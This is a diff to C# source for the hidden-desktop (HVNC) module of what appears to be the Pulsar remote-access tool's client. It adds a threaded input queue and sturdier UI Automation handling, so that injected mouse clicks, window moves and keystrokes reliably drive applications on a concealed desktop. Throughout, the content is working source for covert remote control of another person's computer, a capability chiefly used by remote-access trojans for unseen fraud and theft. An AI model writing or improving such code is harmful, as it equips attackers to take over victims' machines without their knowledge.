@@ -2,9 +2,11 @@
 using Pulsar.Common.Messages.Monitoring.HVNC;
 using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
 using System;
+using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Windows;
 using System.Windows.Automation;
 
@@ -199,8 +201,12 @@ namespace Pulsar.Client.Helper.HVNC
         private POINT lastClickCoords = new POINT { x = 0, y = 0 };
         private POINT lastWindowDimensions = new POINT { x = 0, y = 0 };
         private IntPtr windowToMove = IntPtr.Zero;
-        private IntPtr workingWindow = IntPtr.Zero;
-        private static readonly object syncLock = new object();
+    private IntPtr workingWindow = IntPtr.Zero;
+    private static readonly object syncLock = new object();
+
+    private readonly BlockingCollection<InputMessage> _inputQueue = new BlockingCollection<InputMessage>(new ConcurrentQueue<InputMessage>());
+    private readonly CancellationTokenSource _inputCancellation = new CancellationTokenSource();
+    private readonly Thread _inputWorker;
 
         private bool isShiftPressed = false;
         private bool isControlPressed = false;
@@ -243,6 +249,13 @@ namespace Pulsar.Client.Helper.HVNC
             this.Desktop = desktopHandle;
             
             InitializeModifierKeyStates();
+
+            _inputWorker = new Thread(() => ProcessInputQueue(_inputCancellation.Token))
+            {
+                IsBackground = true,
+                Name = "HVNC Input Worker"
+            };
+            _inputWorker.Start();
         }
 
         /// <summary>
@@ -250,6 +263,26 @@ namespace Pulsar.Client.Helper.HVNC
         /// </summary>
         public void Dispose()
         {
+            _inputQueue.CompleteAdding();
+            _inputCancellation.Cancel();
+
+            if (_inputWorker != null && _inputWorker.IsAlive)
+            {
+                try
+                {
+                    if (!_inputWorker.Join(TimeSpan.FromSeconds(2)))
+                    {
+                        _inputWorker.Join();
+                    }
+                }
+                catch (ThreadStateException)
+                {
+                }
+            }
+
+            _inputQueue.Dispose();
+            _inputCancellation.Dispose();
+
             CloseDesktop(this.Desktop);
             GC.Collect();
         }
@@ -589,19 +622,85 @@ namespace Pulsar.Client.Helper.HVNC
         /// <param name="lParam">The lParam of the message.</param>
         public void Input(uint msg, IntPtr wParam, IntPtr lParam)
         {
+            if (_inputQueue.IsAddingCompleted)
+            {
+                return;
+            }
+
+            try
+            {
+                _inputQueue.Add(new InputMessage
+                {
+                    Message = msg,
+                    WParam = wParam,
+                    LParam = lParam
+                });
+            }
+            catch (ObjectDisposedException)
+            {
+                // handler is disposing; ignore input
+            }
+            catch (InvalidOperationException)
+            {
+                // queue has been marked as complete; drop the input
+            }
+        }
+
+        private void ProcessInputQueue(CancellationToken cancellationToken)
+        {
+            while (!cancellationToken.IsCancellationRequested)
+            {
+                try
+                {
+                    if (_inputQueue.TryTake(out InputMessage inputMessage, Timeout.Infinite, cancellationToken))
+                    {
+                        try
+                        {
+                            ProcessInputMessage(inputMessage);
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"HVNC input processing error: {ex.Message}");
+                        }
+                    }
+                }
+                catch (OperationCanceledException)
+                {
+                    break;
+                }
+            }
+
+            while (_inputQueue.TryTake(out InputMessage remainingMessage))
+            {
+                try
+                {
+                    ProcessInputMessage(remainingMessage);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"HVNC input processing error during drain: {ex.Message}");
+                }
+            }
+        }
+
+        private void ProcessInputMessage(InputMessage inputMessage)
+        {
             lock (syncLock)
             {
                 SetThreadDesktop(this.Desktop);
 
-                // Handle mouse messages
-                if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP || 
-                    msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP || 
+                uint msg = inputMessage.Message;
+                IntPtr wParam = inputMessage.WParam;
+                IntPtr lParam = inputMessage.LParam;
+
+                if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP ||
+                    msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP ||
                     msg == WM_MOUSEMOVE)
                 {
                     int x = GetXCoordinate(lParam);
                     int y = GetYCoordinate(lParam);
                     POINT cursorPosition = new POINT { x = x, y = y };
-                    
+
                     bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
                     bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);
 
@@ -619,19 +718,30 @@ namespace Pulsar.Client.Helper.HVNC
                         }
                     }
 
+                    if (automationClickArmed && msg == WM_MOUSEMOVE)
+                    {
+                        IntPtr automationWindow = automationClickWindow;
+                        automationClickArmed = false;
+                        automationClickWindow = IntPtr.Zero;
+
+                        if (automationWindow != IntPtr.Zero)
+                        {
+                            PostMessage(automationWindow, WM_LBUTTONDOWN, automationClickDownWParam, automationClickDownLParam);
+                            workingWindow = automationWindow;
+                        }
+                    }
+
                     if (isMovingWindow && isUp && isLeft)
                     {
-                        // If we were moving a window and now released the button, complete the move
-                        SetWindowPos(windowToMove, IntPtr.Zero, 
-                            x - lastClickCoords.x, 
+                        SetWindowPos(windowToMove, IntPtr.Zero,
+                            x - lastClickCoords.x,
                             y - lastClickCoords.y,
-                            lastWindowDimensions.x, 
-                            lastWindowDimensions.y, 
+                            lastWindowDimensions.x,
+                            lastWindowDimensions.y,
                             0);
                         isMovingWindow = false;
                     }
 
-                    // Get the window under the cursor
                     IntPtr hwnd = WindowFromPoint(cursorPosition);
                     workingWindow = hwnd;
 
@@ -653,36 +763,29 @@ namespace Pulsar.Client.Helper.HVNC
 
                     if (hwnd != IntPtr.Zero)
                     {
-                        // Get window information
                         RECT windowRect;
                         GetWindowRect(hwnd, out windowRect);
-                        
-                        // Calculate window position and size
+
                         int windowX = windowRect.left;
                         int windowY = windowRect.top;
                         int windowWidth = windowRect.right - windowRect.left;
                         int windowHeight = windowRect.bottom - windowRect.top;
-                        
-                        // Calculate position relative to window
+
                         POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
-                        
-                        // Get hit test result to determine what part of the window was clicked
+
                         IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                         int hitTestResultInt = hitTestResult.ToInt32();
 
                         if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
                         {
-                            // Close button clicked
                             Debug.WriteLine("Closing window");
                             PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                             PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
                         }
                         else if (hitTestResultInt == HTCAPTION)
                         {
-                            // Title bar clicked
                             if (!isUp && isLeft && msg == WM_LBUTTONDOWN)
                             {
-                                // Start window move operation
                                 lastClickCoords = clickCoords;
                                 lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
                                 isMovingWindow = true;
@@ -692,11 +795,10 @@ namespace Pulsar.Client.Helper.HVNC
                         }
                         else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
                         {
-                            // Maximize/Restore button clicked
                             WINDOWPLACEMENT windowPlacement = default;
                             windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
                             GetWindowPlacement(hwnd, ref windowPlacement);
-                            
+
                             if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                             {
                                 Debug.WriteLine("Restoring window");
@@ -710,20 +812,18 @@ namespace Pulsar.Client.Helper.HVNC
                         }
                         else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
                         {
-                            // Minimize button clicked
                             Debug.WriteLine("Minimizing window");
                             PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                         }
                         else
                         {
-                            // Regular window area clicked - forward the mouse message
                             IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
                             IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
                             PostMessage(hwnd, msg, param, translatedLParam);
                         }
                     }
                 }
-                // Handle keyboard messages
+
                 if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                 {
                     if (TryHandleKeyboardWithUIAutomation(msg, wParam))
@@ -1143,15 +1243,67 @@ namespace Pulsar.Client.Helper.HVNC
                 return;
             }
 
-            automationFailureCount++;
+            bool criticalFailure = IsCriticalAutomationFailure(ex);
+
+            if (criticalFailure)
+            {
+                automationFailureCount = AUTOMATION_FAILURE_THRESHOLD;
+            }
+            else
+            {
+                automationFailureCount++;
+            }
+
             Debug.WriteLine($"UIA disabled attempt #{automationFailureCount}: {ex.Message}");
 
             if (automationFailureCount >= AUTOMATION_FAILURE_THRESHOLD)
             {
                 automationEnabled = false;
                 automationRetryAfter = DateTime.UtcNow + AUTOMATION_RETRY_BACKOFF;
+                automationClickArmed = false;
                 Debug.WriteLine("UIA interactions disabled temporarily due to repeated failures.");
             }
+        }
+
+        private bool IsCriticalAutomationFailure(Exception ex)
+        {
+            if (ex == null)
+            {
+                return false;
+            }
+
+            if (ex is ElementNotAvailableException)
+            {
+                return true;
+            }
+
+            string message = ex.Message ?? string.Empty;
+
+            if (ContainsIgnoreCase(message, "operation is invalid due to the current state of the object") ||
+                ContainsIgnoreCase(message, "L'op\u00E9ration n'est pas valide en raison de l'\u00E9tat actuel de l'objet") ||
+                ContainsIgnoreCase(message, "target element corresponds to a user interface that is no longer available"))
+            {
+                return true;
+            }
+
+            if (ex is InvalidOperationException invalid &&
+                (invalid.Source?.IndexOf("UIAutomation", StringComparison.OrdinalIgnoreCase) >= 0 ||
+                 invalid.StackTrace?.IndexOf("MS.Internal.Automation", StringComparison.OrdinalIgnoreCase) >= 0))
+            {
+                return true;
+            }
+
+            return false;
+        }
+
+        private static bool ContainsIgnoreCase(string source, string value)
+        {
+            if (string.IsNullOrEmpty(source) || string.IsNullOrEmpty(value))
+            {
+                return false;
+            }
+
+            return source.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0;
         }
 
         private void HandleAutomationSkip()
@@ -1169,6 +1321,13 @@ namespace Pulsar.Client.Helper.HVNC
             automationFailureCount = 0;
             automationEnabled = true;
             automationRetryAfter = DateTime.MinValue;
+        }
+
+        private struct InputMessage
+        {
+            public uint Message;
+            public IntPtr WParam;
+            public IntPtr LParam;
         }
 
         #endregion
